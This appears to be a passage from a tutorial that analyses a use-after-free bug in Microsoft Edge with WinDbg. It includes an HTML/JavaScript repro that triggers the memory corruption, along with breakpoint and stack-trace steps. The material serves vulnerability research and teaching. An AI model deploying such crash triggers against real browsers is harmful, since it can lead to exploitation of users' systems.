Analyzing the use-after-free using a debugger.
-----------------------------------------
You can start Edge and attach a debugger using [EdgeDbg][]. I will be using
WinDbg as my debugger and the [EdgeWinDbg.cmd][] script that comes with
[EdgeDbg][] in order to start Edge and attach WinDbg. The first argument to
[EdgeWinDbg.cmd][] is the URL that Edge should load once started. Again, this
conveniently defaults to `http://%COMPUTERNAME%:28876`. Simply run the
following command to start Edge and load the repro:
```
EdgeWinDbg.cmd
```
In order to be able to see what happens *before* the crash and find out how big
the block of memory was that was freed, we'll could set a breakpoint at some
point in the code that is executed before the memory is freed, and then step
through the code to the point where `CTreeNode::NodeRelease` is called.
We could set such a breakpoint at the moment Edge is started, but whatever
function we set the breakpoint in may be called numerous times before the call
that we're interested in. It may be difficult to determine which of these calls
is the one in which the free happens and cumbersome (not to mention error
prone) to manually check them. To set a breakpoint on a function at the last
possible moment before the memory is freed, we can put an `alert()` in the
script right before the part of the script that causes it.

As we learned from the stack in the [BugId][] report, `CSpliceTreeEngine::Init` is
a good location to start our analysis, because both the free and re-use happen
in functions called by it. The stack also indicates that this happens during
execution of the function `Tree::TreeWriter::InsertBefore`, so it's a pretty
safe bet that we can put the alert right before the line `x.insertBefore(h,h);`
in our repro, like so:
```Javascript
    <script>
      onload = function() {
        x.appendChild(h)
        x.offsetTop;
        alert();
        x.insertBefore(h,h);
      };
    </script>
    <br id=h>
    <select id=x>
    x
```
When you've started Edge in WinDbg and see the popup, please break into the
debugger, select the process that is running the `microsoftedgecp.exe` binary,
and execute the following command to set a breakpoint at
`CSpliceTreeEngine::Init`:
```
1:050> |
#  0	id: 56c	attach	name: C:\Windows\SystemApps\Microsoft.MicrosoftEdge_8wekyb3d8bbwe\MicrosoftEdge.exe
.  1	id: 1364	attach	name: C:\Windows\SystemApps\Microsoft.MicrosoftEdge_8wekyb3d8bbwe\microsoftedgecp.exe
   2	id: 1030	attach	name: C:\Windows\system32\browser_broker.exe
   3	id: f2c	attach	name: C:\Windows\System32\RuntimeBroker.exe
1:050> |1s
ntdll!NtWaitForWorkViaWorkerFactory+0xa:
1:050> bp EDGEHTML!CSpliceTreeEngine::Init
1:050> g
```
*Note that I am using `.prompt_allow -dis` to suppress the disassembly normally
shown before the prompt, as I feel this makes for a much cleaner output.*
*Also note that WinDbg always attaches to these four processes in the same
order, so you can always use `|1s` to switch to the `microsoftedgecp.exe`
process.*

After this you can resume Edge in the debugger and dismiss the `alert()` in
Edge. The debugger should report that the breakpoint was hit almost
immediately. If you look at the stack, you will notice that
`CSpliceTreeEngine::Init` is executed during `Tree::TreeWriter::InsertBefore`.
```
1:050> g
Breakpoint 0 hit
EDGEHTML!CSpliceTreeEngine::Init:
1:050> kc 5
Call Site
EDGEHTML!CSpliceTreeEngine::Init
EDGEHTML!Tree::TreeWriter::SpliceTreeInternal
EDGEHTML!Tree::TreeWriter::CutCopyMoveLegacy
EDGEHTML!Tree::TreeWriter::MoveNodeLegacy
EDGEHTML!Tree::TreeWriter::InsertBefore
1:050>
```
If you resume Edge, you will hit the access violation.
```
1:050> g
(2d8.974): Access violation - code c0000005 (first chance)
First chance exceptions are reported before any exception handling.
This exception may be expected and handled.
EDGEHTML!CTreePosGap::PartitionPointers+0x68:
```
This proves that we've set the breakpoint before the re-use of freed memory,
but we still need to find out if we've set it before the free as well.

[BugId]: https://github.com/SkyLined/BugId
[EdgeDbg]: https://github.com/SkyLined/EdgeDbg
[EdgeWinDbg.cmd]: https://github.com/SkyLined/EdgeDbg/blob/master/EdgeWinDbg.cmd
